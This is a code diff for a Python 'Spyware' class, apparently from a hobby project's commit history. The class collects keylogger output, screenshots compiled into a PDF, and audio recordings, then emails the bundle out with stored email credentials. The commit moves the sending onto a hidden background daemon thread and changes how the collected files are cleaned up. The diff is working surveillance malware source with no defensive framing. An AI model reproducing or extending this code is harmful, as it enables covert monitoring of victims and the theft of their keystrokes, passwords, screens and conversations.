Send reports on separate thread

+++ spyware.py
@@ -50,32 +50,39 @@ class Spyware:
             # [t.join() for t in async_tasks]
             sleep(int(self.user_info['frequency']))
 
-            print('\n\nPDF processing started...')
+            print('\n\nRemoving alpha channel from images...')
+            visual.remove_alpha_channel()
+
+            print('PDF processing started...')
             visual.make_pdf()
 
             files_list = [
-                normalize_path_name(self.user_path, 'pdf_record', 'ready.pdf'),
+                normalize_path_name(self.user_path, 'pdf_record', os.listdir(normalize_path_name(self.user_path, 'pdf_record'))[0]),
                 normalize_path_name(self.user_path, 'keylog_record', 'keylog.txt'),
                 normalize_path_name(self.user_path, 'audio_record', os.listdir(normalize_path_name(self.user_path, 'audio_record'))[0])
                           ]
-
-            print('Email sending started...')
-            self.send_report(files_list)
-
-            print('Directories cleanup started...')
-            for f in files_list:
-                os.remove(f)
-
-            for img in os.listdir(normalize_path_name(self.user_path, 'images_record')):
-                os.remove(normalize_path_name(self.user_path, 'images_record', img))
+            print('Sending email...')
+            send_email_report = Thread(target=partial(self.send_report, files_list), daemon=True)
+            send_email_report.start()
 
     def send_report(self, files_list):
         message_rep = 'Full report (keylogger + screenshots + audio)'
         try:
             send_mail(self.user_info['email'], self.user_info['password'], message_rep, 'Spyware report', files_list)
-        except:
+        except Exception as e:
+            print(e)
             error_msg = 'Could not send that'
             send_mail(self.user_info['email'], self.user_info['password'], error_msg, 'Spyware report')
+
+        print('Directories cleanup started...')
+
+        files_list.pop(1) # to not remove keylog.txt file
+        for f in files_list:
+            if os.path.isfile(f):
+                os.remove(f)
+
+        # for img in os.listdir(normalize_path_name(self.user_path, 'images_record')):
+        #     os.remove(normalize_path_name(self.user_path, 'images_record', img))
 
     def setup_dirs(self):
         dirs_to_make = ['images_record', 'audio_record', 'keylog_record', 'pdf_record']
